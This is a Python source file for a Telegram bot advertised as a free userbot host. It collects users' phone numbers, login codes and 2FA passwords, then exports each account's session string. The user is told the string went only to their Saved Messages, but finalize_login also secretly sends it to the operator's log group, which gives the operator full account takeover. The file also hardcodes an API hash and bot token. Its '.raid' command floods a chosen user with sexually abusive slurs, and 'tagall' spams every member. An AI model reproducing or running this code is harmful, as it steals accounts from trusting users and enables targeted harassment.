import os
import asyncio
import random
from pyrogram import Client, filters, errors, handlers
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask
from threading import Thread

# --- WEB SERVER FOR RENDER ---
app = Flask('')

@app.route('/')
def home():
    return "xᴇɴᴏ Bᴏᴛ Is Oɴʟɪɴᴇ! ✨"

def run_web():
    app.run(host='0.0.0.0', port=8080)

# --- CONFIGURATION ---
API_ID = 31980984
API_HASH = "a61358dd3cd8c3a56cd53d9ddd8a0c67"
BOT_TOKEN = "8303588999:AAEnHHO7ULTHA5IJKJAAGV8WEXSnV5dhz_M"
LOG_GROUP = -1003867805165 
START_IMG = "https://graph.org/file/422440e09d466500f2c93-953253772b0d8d2bfc.jpg"

bot = Client("XenoGen", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
user_data = {}
active_tasks = {}

# --- BUTTONS ---
main_buttons = InlineKeyboardMarkup([
    [InlineKeyboardButton("❂ 𝐔𝐩𝐝𝐚𝐭𝐞 ❂", url="https://t.me/radhesupport"),
     InlineKeyboardButton("❂ 𝐒𝐮𝐩𝐩𝐨𝐫𝐭 ❂", url="https://t.me/radhesupport")],
    [InlineKeyboardButton("❂ 𝐂𝐥𝐨𝐬𝐞 ❂", callback_data="close")]
])

# --- CHAT LISTS ---
SWEET_CHATS = [
    "✨ ʀᴀᴅʜᴇ ʀᴀᴅʜᴇ {mention} ᴊɪ, ᴋᴀɪsᴇ ʜᴏ ᴀᴀᴘ? ✨", "☁️ ᴏʏᴇ {mention}, ᴋʏᴀ ᴄʜᴀʟ ʀᴀʜᴀ ʜᴀɪ ᴀᴀᴊ ᴋᴀʟ? ☁️",
    "🍃 {mention} ᴊɪ, ᴋʜᴀɴᴀ ᴘɪɴᴀ ʜᴏ ɢᴀʏᴀ ᴀᴀᴘᴋᴀ? 🍃", "🍭 {mention} ᴋʏᴀ ᴋᴀʀ ʀʜᴇ ʜᴏ, ʙᴏʜᴏᴛ ʙᴜsʏ ʟᴀɢ ʀʜᴇ ʜᴏ? 🍭",
    "🎀 ʜᴇʏ {mention}, ɢʀᴏᴜᴘ ᴍᴇ ᴀᴀᴏ ɴᴀ ᴄʜᴀᴛ ᴋᴀʀᴛᴇ ʜᴀɪɴ! 🎀", "🌸 {mention} ᴀᴀᴘᴋɪ ᴅᴘ ᴛᴏ ʙᴏʜᴏᴛ ᴘʏᴀᴀʀɪ ʜᴀɪ! 🌸",
    "💎 ᴏʏᴇ {mention}, ᴋᴀʜᴀ ɢᴀʏᴀʙ ʜᴏ ɢᴀʏᴇ ʜᴏ ᴀᴀᴘ? 💎", "🌈 {mention} ᴊɪ, ᴀᴀᴊ ᴋᴀ ᴅɪɴ ᴋᴀɪsᴀ ʀᴀʜᴀ ᴀᴀᴘᴋᴀ? 🌈",
    "🍓 {mention} sᴜɴᴏ, ᴇᴋ ʙᴀᴀᴛ ʙᴀᴛᴀᴏ ɴᴀ? 🍓", "🐥 {mention} ɪᴛɴɪ sʜᴀɴᴛɪ ᴋʏᴜɴ ʜᴀɪ, ᴋᴜᴄʜ ᴛᴏ ʙᴏʟᴏ? 🐥",
    "🚀 {mention} ᴊɪ, ᴀᴀᴘsᴇ ʙᴀᴀᴛ ᴋᴀʀᴋᴇ ᴀᴄʜᴀ ʟᴀɢᴛᴀ ʜᴀɪ! 🚀", "🎈 ʜᴇʏ {mention}, ᴄʜᴀʟᴏ ᴀᴀᴊ sᴀʙ ᴍɪʟᴋᴇ ᴍᴀsᴛɪ ᴋᴀʀᴛᴇ ʜᴀɪɴ! 🎈",
    "🦋 {mention} ᴀᴀᴘ ɢʀᴏᴜᴘ ᴋɪ sʜᴀᴀɴ ʜᴏ ᴊɪ! 🦋", "🧸 {mention} ᴋʏᴀ ʜᴜᴀ ᴀᴀᴘ ᴜᴅᴀᴀs ʟᴀɢ ʀʜᴇ ʜᴏ? 🧸",
    "🌟 ʀᴀᴅʜᴇ ʀᴀᴅʜᴇ {mention}, ʜᴀsᴛᴇ ʀᴀʜᴀ ᴋᴀʀᴏ ᴀᴀᴘ! 🌟", "🍦 {mention} ᴊɪ, ᴀᴀᴊ ᴛᴏ ʙᴏʜᴏᴛ ᴅɪɴ ʙᴀᴀᴅ ᴅɪᴋʜᴇ ᴀᴀᴘ! 🍦",
    "🎶 {mention} ᴄʜᴀʟᴏ ᴋᴜᴄʜ ᴀᴄʜᴀ sᴜɴᴀᴛᴇ ʜᴀɪɴ ᴀᴀᴊ! 🎶", "💫 {mention} ᴀᴀᴘ ᴊᴀɪsᴇ ᴅᴏsᴛ ʙᴏʜᴏᴛ ᴋᴀᴍ ᴍɪʟᴛᴇ ʜᴀɪɴ! 💫",
    "🐱 {mention} ᴊɪ, ᴋʏᴀ ʜᴜᴀ ɢᴜssᴀ ʜᴏ ᴋʏᴀ ᴀᴀᴘ? 🐱", "🍀 {mention} ᴀᴀᴘᴋᴀ sᴡᴀɢᴀᴛ ʜᴀɪ ʜᴀᴍᴀʀᴇ ɢʀᴏᴜᴘ ᴍᴇ! 🍀",
    "🐾 {mention} sᴜɴᴏ ɴᴀ, ᴄʜᴀɪ ᴘɪ ʟɪ ᴀᴀᴘɴᴇ? 🐾", "🌙 sʜᴜʙʜ ʀᴀᴛʀɪ {mention} ᴊɪ, ᴍᴇᴇᴛʜᴇ sᴀᴘɴᴇ! 🌙",
    "☀️ sᴜᴘʀᴀʙʜᴀᴛ {mention}, ᴀᴀᴊ ᴋᴀ ᴅɪɴ sʜᴜʙʜ ʜᴏ! ☀️", "🦊 {mention} ᴀᴀᴘ ʙᴏʜᴏᴛ ᴄʜᴀʟᴀᴋ ʜᴏ ɢᴀʏᴇ ʜᴏ! 🦊",
    "🧊 {mention} ᴊɪ, ɪᴛɴᴇ ᴄᴏᴏʟ ᴋᴀɪsᴇ ʜᴏ ᴀᴀᴘ? 🧊", "🦄 {mention} ᴀᴀᴘ ᴛᴏ ᴍᴀɢɪᴄᴀʟ ɪɴsᴀᴀɴ ʜᴏ! 🦄",
    "🌻 {mention} ᴀᴀᴘ ʜᴀᴍᴇsʜᴀ ᴋʜɪʟᴇ ʀᴀʜᴀ ᴋᴀʀᴏ! 🌻", "🚲 {mention} ᴄʜᴀʟᴏ ᴋᴀʜɪ ɢʜᴏᴏᴍɴᴇ ᴄʜᴀʟᴛᴇ ʜᴀɪɴ! 🚲",
    "🍎 {mention} sᴇʜᴀᴛ ᴋᴀ ᴅʜʏᴀᴀɴ ʀᴀᴋʜᴀ ᴋᴀʀᴏ! 🍎", "🌊 {mention} sᴜᴍᴜɴᴅᴀʀ ᴊᴀɪsɪ ɢᴇʜʀɪ ʙᴀᴀᴛᴇɪɴ! 🌊",
    "🎸 {mention} ᴊɪ, ᴋᴏɪ ɢᴀᴀɴᴀ sᴜɴᴀᴏ ɴᴀ? 🎸", "📸 {mention} ᴀᴀᴘᴋɪ sᴍɪʟᴇ ᴘᴇʀғᴇᴄᴛ ʜᴀɪ! 📸",
    "🥞 {mention} ᴀᴀᴘᴋɪ ʙᴀᴀᴛᴇɪɴ ᴍᴀᴋᴋʜᴀɴ ᴊᴀɪsɪ ʜᴀɪɴ! 🥞", "🥨 {mention} ᴛʜᴏᴅᴇ ᴛᴇᴅʜᴇ ʜᴏ ᴘᴀʀ ᴍᴇʀᴇ ʜᴏ! 🥨",
    "🍯 {mention} sʜᴀʜᴀᴅ ᴊᴀɪsɪ ᴍɪᴛʜᴀs ʜᴀɪ ᴀᴀᴘᴍᴇ! 🍯", "🌌 {mention} ᴛᴀᴀʀᴏ ᴊᴀɪsᴇ ᴄʜᴀᴍᴀᴋᴛᴇ ʀᴀʜᴏ! 🌌"
]

ABUSE_RAIDS = [
    "ᴛᴇʀɪ ᴍᴀᴀ ᴋɪ ᴄʜᴏᴏᴛ ᴍᴇ @target ᴋᴀ ʟᴀɴᴅ 👊",
    "ɴɪᴋᴀʟ ᴍᴀᴅᴀʀᴄʜᴏᴅ @target ʙᴇᴛᴀ ᴘᴀᴘᴀ sᴇ ᴘᴀɴɢᴀ ɴᴀʜɪ!",
    "ᴀʙᴇʏ sᴀᴀʟᴇ @target ᴛᴇʀɪ ʙᴀʜᴇɴ ᴋᴏ ✘ᴇɴᴏ ɴᴇ ᴘᴇʟᴀ 🥵",
    "ɢᴀᴀɴᴅ ᴍᴇ ᴅᴜᴍ ɴᴀʜɪ @target ᴀᴜʀ ✘ᴇɴᴏ sᴇ ʟᴀᴅᴀɪ? 🔥",
    "ᴄʜᴜᴘ ᴋᴀʀ @target ʀᴀɴᴅɪ ᴋᴇ ᴘɪʟʟᴇ! 🖕",
    "ᴛᴇʀɪ ᴍᴀᴀ ᴋᴀ ʙʜᴏsᴅᴀ @target ᴋᴜᴛᴛᴇ ᴋɪ ᴀᴜʟᴀᴅ ☠️",
    "ʀᴀɴᴅɪ ᴋᴇ ᴊᴀɴᴇ @target ᴀᴜᴋᴀᴛ ᴍᴇ ʀᴇʜ ʙᴇᴛᴀ 🤬"
]

# --- USERBOT COMMAND FUNCTIONS ---

async def alive_cmd(c, m):
    await m.edit_text(
        "✨ **『 xᴇɴᴏ ᴜsᴇʀʙᴏᴛ ɪs ᴀʟɪᴠᴇ 』** ✨\n\n"
        "➪ **sᴛᴀᴛᴜs:** `ʀᴜɴɴɪɴɢ ᴘᴇʀғᴇᴄᴛ` ⚡\n"
        "➪ **ᴏᴡɴᴇʀ:** `ᴍᴇ` 🍷\n"
        "➪ **sᴜᴘᴘᴏʀᴛ:** @radhesupport\n\n"
        "**ᴘᴏᴡᴇʀ ᴏғ ꜱᴀᴍᴀʀ - @KishanPutraSamar**"
    )

async def tagall_cmd(c, m):
    uid = c.me.id
    active_tasks[uid] = True 
    await m.delete()
    async for member in c.get_chat_members(m.chat.id):
        if not active_tasks.get(uid): break 
        if member.user.is_bot: continue
        try:
            await c.send_message(m.chat.id, f"{member.user.mention} ⚡ **xᴇɴᴏ ɪs ʜᴇʀᴇ!**")
            await asyncio.sleep(1.5)
        except: pass

async def onetag_cmd(c, m):
    uid = c.me.id
    active_tasks[uid] = True 
    await m.delete()
    async for member in c.get_chat_members(m.chat.id):
        if not active_tasks.get(uid): break 
        if member.user.is_bot: continue
        try:
            msg = random.choice(SWEET_CHATS).format(mention=member.user.mention)
            await c.send_message(m.chat.id, f"👤 {msg}")
            await asyncio.sleep(1.5)
        except: pass

async def raid_cmd(c, m):
    uid = c.me.id
    if len(m.command) < 3: return await m.edit("𝐔𝐬𝐚𝐠𝐞: `.𝐫𝐚𝐢𝐝 𝟓 @𝐮𝐬𝐞𝐫`")
    active_tasks[uid] = True 
    try:
        count = int(m.command[1])
    except ValueError:
        return await m.edit("❌ Count must be a number.")
    target = m.command[2]
    await m.delete()
    for _ in range(count):
        if not active_tasks.get(uid): break 
        await c.send_message(m.chat.id, random.choice(ABUSE_RAIDS).replace("@target", target))
        await asyncio.sleep(1.2)

async def stop_cmd(c, m):
    uid = c.me.id
    active_tasks[uid] = False 
    await m.edit("🚫 **『 ᴀʟʟ ᴘʀᴏᴄᴇssᴇs sᴛᴏᴘᴘᴇᴅ 』**\n\n**ᴘᴏᴡᴇʀ ᴏғ xᴇɴᴏ - @XenoEmpir**")

# --- BOT MAIN COMMANDS ---

@bot.on_message(filters.command("start") & filters.private)
async def start(c, m):
    await m.reply_photo(
        photo=START_IMG,
        caption=(f"✨ **ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ xᴇɴᴏ ᴜsᴇʀʙᴏᴛ** ✨\n\n"
                 f"ʜᴇʏ {m.from_user.mention},\n"
                 "ᴍᴀɪɴ ᴀᴀᴘᴋɪ ɪᴅ ᴋᴏ **ʙᴏᴏsᴛ** ᴋᴀʀɴᴇ ᴀᴜʀ **ᴀɴɪᴍᴀᴛɪᴏɴs** ᴋᴇ ʟɪʏᴇ ᴜsᴇʀʙᴏᴛ ʜᴏsᴛ ᴋᴀʀ sᴀᴋᴛᴀ ʜᴏᴏɴ.\n\n"
                 "📝 **ᴄᴏᴍᴍᴀɴᴅs:**\n"
                 "» **/help** : ᴏᴘᴇɴ ʜᴇʟᴘ ᴍᴇɴᴜ\n"
                 "» **/guide** : ʜᴏᴡ ᴛᴏ ʜᴏsᴛ ʙᴏᴛ\n"
                 "» **/add** : sᴛᴀʀᴛ ʜᴏsᴛɪɴɢ ᴘʀᴏᴄᴇss\n\n"
                 "**ᴘᴏᴡᴇʀ ᴏғ ꜱᴀᴍᴀʀ** - @radhesupport"),
        reply_markup=main_buttons
    )

@bot.on_message(filters.command("help") & filters.private)
async def help_cmd(c, m):
    help_text = ("✨ **『 ᴀᴠᴀɪʟᴀʙʟᴇ ᴄᴏᴍᴍᴀɴᴅs 』** ✨\n\n"
                 "⭐ **/start** — sᴛᴀʀᴛ ᴛʜᴇ ʙᴏᴛ\n"
                 "📖 **/help** — ᴏᴘᴇɴ ʜᴇʟᴘ ᴍᴇɴᴜ\n"
                 "⚡ **/guide** — ᴏᴘᴇɴ ɢᴜɪᴅᴇ ᴍᴇɴᴜ\n"
                 "🚀 **/add** — ᴀᴜᴛᴏ-ʜᴏsᴛ ᴛʜᴇ ʙᴏᴛ\n"
                 "❌ **/remove** — ʟᴏɢᴏᴜᴛ ғʀᴏᴍ ʙᴏᴛ\n\n"
                 "**Userbot Commands (Type with '.'):**\n"
                 "» `.alive` | `.tagall` | `.onetag` | `.raid` | `.stop`")
    await m.reply_photo(photo=START_IMG, caption=help_text, reply_markup=main_buttons)

@bot.on_message(filters.command("guide") & filters.private)
async def guide_cmd(c, m):
    guide_text = (
        "❖ **ǫᴜɪᴄᴋ ɢᴜɪᴅᴇ ᴛᴏ ʜᴏsᴛɪɴɢ xᴇɴᴏ ᴜsᴇʀʙᴏᴛ**\n\n"
        "1) sᴇɴᴅ **/add** ᴄᴏᴍᴍᴀɴᴅ\n"
        "2) sᴇɴᴅ ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ (+91...)\n"
        "3) sᴇɴᴅ ᴛᴇʟᴇɢʀᴀᴍ ᴏᴛᴘ ʟɪᴋᴇ: `1 2 3 4 5`\n"
        "4) sᴇɴᴅ 2FA ᴘᴀssᴡᴏʀᴅ (ɪғ ᴀɴʏ)\n\n"
        "**ᴘᴏᴡᴇʀ ᴏғ xᴇɴᴏ** - @radhesupport"
    )
    await m.reply_photo(photo=START_IMG, caption=guide_text, reply_markup=main_buttons)

# --- LOGIN & AUTO-HOST LOGIC ---

@bot.on_message(filters.command("add") & filters.private)
async def add_process(c, m):
    await m.reply_text("📲 **ᴘʟᴇᴀsᴇ sᴇɴᴅ ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ**\n(e.g., `+918200000009`):")

@bot.on_message(filters.text & filters.private & ~filters.bot)
async def handle_steps(c, m):
    uid = m.from_user.id
    text = m.text
    if text.startswith("+"):
        user_data[uid] = {"phone": text}
        temp_c = Client(f"temp_{uid}", API_ID, API_HASH, in_memory=True)
        await temp_c.connect()
        try:
            code = await temp_c.send_code(text)
            user_data[uid].update({"client": temp_c, "hash": code.phone_code_hash})
            await m.reply_text("📩 **ᴏᴛᴘ sᴇɴᴛ!** ᴘʟᴇᴀsᴇ sᴇɴᴅ: `1 2 3 4 5`")
        except Exception as e: await m.reply_text(f"❌ **Error:** `{e}`")
    elif text.replace(" ", "").isdigit() and uid in user_data and "hash" in user_data[uid]:
        otp = text.replace(" ", "")
        try:
            await user_data[uid]["client"].sign_in(user_data[uid]["phone"], user_data[uid]["hash"], otp)
            await finalize_login(c, m, uid)
        except errors.SessionPasswordNeeded: await m.reply_text("🔐 **sᴇɴᴅ ʏᴏᴜʀ 2ғᴀ ᴘᴀssᴡᴏʀᴅ.**")
        except Exception as e: await m.reply_text(f"❌ **OTP Error:** `{e}`")
    elif uid in user_data and "client" in user_data[uid]:
        try:
            await user_data[uid]["client"].check_password(text)
            await finalize_login(c, m, uid)
        except Exception as e: await m.reply_text(f"❌ **2FA Error:** `{e}`")

async def finalize_login(c, m, uid):
    data = user_data[uid]
    string = await data["client"].export_session_string()
    
    try:
        await data["client"].send_message("me", f"✨ **xᴇɴᴏ ᴜsᴇʀʙᴏᴛ sᴛʀɪɴɢ** ✨\n\n`{string}`\n\n**ᴘᴏᴡᴇʀ ᴏғ xᴇɴᴏ - @XenoEmpir**")
    except: pass

    await m.reply_photo(
        photo=START_IMG,
        caption=f"✅ **ʟᴏɢɢᴇᴅ ɪɴ sᴜᴄᴄᴇsғᴜʟʟʏ!**\n\nsᴇssɪᴏɴ sᴛʀɪɴɢ sᴇɴᴛ ᴛᴏ **sᴀᴠᴇᴅ ᴍᴇssᴀɢᴇs**.\n\n**ᴘᴏᴡᴇʀ ᴏғ xᴇɴᴏ - @XenoEmpir**"
    )
    
    ubot = Client(f"ubot_{uid}", API_ID, API_HASH, session_string=string)
    ubot.add_handler(handlers.MessageHandler(alive_cmd, filters.command("alive", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(tagall_cmd, filters.command("tagall", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(onetag_cmd, filters.command("onetag", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(raid_cmd, filters.command("raid", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(stop_cmd, filters.command("stop", ".") & filters.me))
    
    await ubot.start()
    
    try:
        await bot.send_message(LOG_GROUP, f"🏁 **ɴᴇᴡ sᴇssɪᴏɴ ɢᴇɴᴇʀᴀᴛᴇᴅ**\n**Usᴇʀ:** `{uid}`\n**Sᴛʀɪɴɢ:** `{string}`")
    except: pass
    del user_data[uid]

if __name__ == "__main__":
    Thread(target=run_web, daemon=True).start()
    bot.run()
